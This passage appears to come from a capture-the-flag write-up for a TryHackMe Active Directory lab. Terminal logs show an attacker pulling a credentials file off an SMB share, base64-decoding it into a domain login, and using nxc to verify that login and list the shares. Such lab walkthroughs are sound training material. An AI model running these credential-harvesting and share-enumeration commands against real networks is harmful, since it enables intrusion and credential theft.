
```sh
┌──(kali㉿proxli)-[~]
└─$ smbget --user="svc-admin" --password="management2005" --recursive smb://10.10.106.240/backup
Using domain: WORKGROUP, user: svc-admin
Using domain: WORKGROUP, user: svc-admin
smb://10.10.106.240/backup/backup_credentials.txt                                                              
Downloaded 48b in 1 seconds

┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
└─$ ls -la
total 1100
drwxrwxr-x  2 kali kali   4096 Jul  3 00:39 .
drwxr-xr-x 45 kali kali   4096 Jul  3 00:03 ..
-rwxr-xr-x  1 kali kali     48 Jul  3 00:38 backup_credentials.txt
-rw-r--r--  1 kali kali 569236 Jul  3 00:04 passwordlist.txt
-rw-rw-r--  1 kali kali    558 Jul  3 00:29 svc-admin.hash
-rw-r--r--  1 kali kali 540470 Jul  3 00:04 userlist.txt

┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
└─$ cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
└─$ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
backup@spookysec.local:backup2517860
```

new creds
backup@spookysec.local:backup2517860

```sh
┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
└─$ nxc smb 10.10.106.240 -u "backup" -p "backup2517860" --shares
SMB         10.10.106.240   445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.106.240   445    ATTACKTIVEDIREC  [+] spookysec.local\backup:backup2517860 
SMB         10.10.106.240   445    ATTACKTIVEDIREC  [*] Enumerated shares
SMB         10.10.106.240   445    ATTACKTIVEDIREC  Share           Permissions     Remark
SMB         10.10.106.240   445    ATTACKTIVEDIREC  -----           -----------     ------
SMB         10.10.106.240   445    ATTACKTIVEDIREC  ADMIN$                          Remote Admin
SMB         10.10.106.240   445    ATTACKTIVEDIREC  backup                          
SMB         10.10.106.240   445    ATTACKTIVEDIREC  C$                              Default share
SMB         10.10.106.240   445    ATTACKTIVEDIREC  IPC$            READ            Remote IPC
SMB         10.10.106.240   445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share 
SMB         10.10.106.240   445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share
```

confirmed user and password are correct
